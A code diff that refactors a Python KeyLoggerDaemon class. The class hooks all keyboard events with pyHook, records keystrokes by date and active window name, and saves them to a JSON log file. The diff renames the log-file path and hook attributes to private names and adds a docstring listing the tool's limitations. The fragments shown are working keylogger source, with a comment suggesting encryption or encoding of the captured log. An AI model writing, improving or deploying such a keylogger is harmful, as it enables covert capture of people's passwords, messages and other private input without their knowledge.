@@ -14,11 +14,18 @@ class KeyLoggerDaemon:
     the buffer is written to disk.
 
     buffer structure - {date: {windows name: [list of keystrokes]}}
+
+    Considerations:
+        - PyHook isn't great and can miss keystrokes
+        - Can cause a noticeable slow down on older machines
+        - Window may not always be identifiable
+        - All keystrokes are returned in uppercase (may be able to fix this with ASCII repr)
+        - commas, brackets, hashes etc are returned as Oem_nameOfPunctuation (may be able to fix this with ASCII repr)
     """
-    LOG_FILE: str = "LOG.json"  # log file path
+    __LOG_FILE: str = "LOG.json"  # log file path
 
     def __init__(self):
-        self.hook = hook = pyHook.HookManager()
+        self.__hook = hook = pyHook.HookManager()
         hook.KeyDown = self.__write_event
 
         try:
@@ -57,7 +64,7 @@ class KeyLoggerDaemon:
 
         :return: buffer
         """
-        return json.load(open(self.LOG_FILE, "r"))
+        return json.load(open(self.__LOG_FILE, "r"))
 
     def __dump_buffer(self):
         """
@@ -67,13 +74,13 @@ class KeyLoggerDaemon:
         Custom dumping functionality can be added here
         e.g encryption, encoding, etc.
         """
-        json.dump(self.buffer, open(self.LOG_FILE, "w"))
+        json.dump(self.buffer, open(self.__LOG_FILE, "w"))
 
     def watch(self):
         """
         Starts the hook event loop
         """
-        self.hook.HookKeyboard()
+        self.__hook.HookKeyboard()
         pythoncom.PumpMessages()
 
 
